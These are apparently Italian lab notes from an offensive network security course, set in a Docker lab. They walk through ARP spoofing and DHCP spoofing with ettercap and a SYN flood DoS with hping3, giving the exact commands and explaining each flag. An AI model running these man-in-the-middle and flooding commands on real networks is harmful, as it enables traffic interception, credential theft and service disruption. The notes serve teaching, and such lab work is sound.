# Offensive net sec
Entro nelle macchine con:

```sudo docker exec -it [ID_MACCHINA]-[IP_MACCHINA] /bin/bash```

# Wireshark
Lo apro con ```sudo wireshark``` e mi metto in ascolto sull'interfaccia br-[hex]

Comandi notevoli:
- ping
- arp -n
- nc -vnlp 8080
- arp -d [IP]

Le ARP entries sono memorizzate temporaneamente dal sistema per evitare di dover chiedere 
ogni volta "Chi ha questo IP?"

# Ettercap
## ARP Spoofing

Lanciando nel man in the middle ```ettercap -T -M arp /// ///```:

-M arp -> attacco man-in-the-middle usando ARP poisoning.

/// /// -> indica: "attacca tutta la rete locale" (cioè, spoofa tutti con tutti).

Ettercap invia falsi pacchetti ARP a tutti i dispositivi nella LAN per convincerli che
 l'attaccante è il gateway. Così, tutto il traffico passa attraverso la macchina 
dell'attaccante che può:

- Sniffare il traffico (es. password, dati).
- Modificare o bloccare i pacchetti.
- Reindirizzare la connessione.

Per attacco mirato:
```
ettercap -T -M arp /10.9.0.6// /10.9.0.5//
#Qui Ettercap spoofa solo tra Bob (10.9.0.6) e Alice (10.9.0.5)
```

Se da Bob (server) lancio iperf -u -s e da alice (client) iperf -u -c 10.9.0.6, il
MITM vede il traffico UDP

## DHCP Spoofing

Obiettivo: fornire falsi IP da parte del MITM

MITM in questo caso finge di essere un server DHCP

Rimuovendo (deconfigurando) eth con ```(Bob) ip a del 10.9.0.6/24 dev eth0```
Bob resta in attesa di un nuovo indirizzo

A quel punto dal MITM (MITM) ```ettercap -T -M dhcp:10.9.0.20-60/255.255.255.0/8.8.8.8```
Inonda la rete dando un range di indirizzi tra 10.9.0.20 a 60

Facendo dhclient da Bob vediamo con:
- ip a: ip assegnato 10.9.0.20
- ip r: usa come gateway il man in the middle

## Attacco DoS SYNflood

Situazione senza attacco:

```sh
iperf -s 	  # BOB	 :  
iperf -c 10.9.0.6 # ALICE:

# [ ID] Interval       Transfer     Bandwidth
# [  3]  0.0-10.0 sec  70.8 GBytes  60.8 Gbits/sec

```

Lancio dal MIM l'attacco

```
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 10.9.0.6
```

| Opzione         | Significato                                                                 |
| --------------- | --------------------------------------------------------------------------- |
| `hping3`        | Strumento di packet crafting TCP/IP, simile a `ping`, ma molto più potente. |
| `-c 10000`      | Invia **10.000 pacchetti**.                                                 |
| `-d 120`        | Ogni pacchetto ha **120 byte di payload**.                                  |
| `-S`            | Setta il **flag SYN**, come nei pacchetti TCP per aprire una connessione.   |
| `-w 64`         | Imposta il **window size TCP** a 64.                                        |
| `-p 21`         | Destinazione: **porta 21** (FTP).                                           |
| `--flood`       | Invia pacchetti **il più velocemente possibile**, senza aspettare risposte. |
| `--rand-source` | Usa **indirizzi IP sorgente casuali** → rende difficile bloccare l’attacco. |
| `10.9.0.6`      | Indirizzo IP **vittima**.                                                   |

```

Situazione sotto attacco: Velocità di trasferimento diminuita a: 68.7 GBytes  59.0 Gbits/sec
